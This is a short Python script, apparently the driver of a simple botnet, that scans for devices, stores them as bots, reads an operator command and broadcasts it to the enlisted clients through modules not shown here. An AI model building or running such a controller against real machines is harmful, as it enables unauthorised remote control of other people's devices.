from scan_device import Scanbot
import sys
import re
import os
import socket
import time
from multiprocessing import Process
from rwList import RW
from command import Command
import argparse


listip = Scanbot.scan()

Scanbot.display_result(listip)

order = input("Command:")
RW.saveBot(listip)
botNet = Command.addClient()
Command.botnetCommand(order,botNet)  
